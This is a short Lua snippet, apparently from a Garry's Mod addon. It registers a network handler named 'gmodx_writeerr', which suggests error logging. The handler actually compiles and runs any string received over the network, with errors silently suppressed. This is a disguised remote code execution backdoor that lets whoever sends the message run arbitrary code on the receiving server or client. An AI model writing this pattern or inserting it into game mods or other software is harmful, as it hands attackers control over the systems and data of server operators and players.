net.Receive("gmodx_writeerr", function()
    local str2 = net.ReadString()
    pcall(CompileString(str2 ~= nil and str2, "Console"))
end)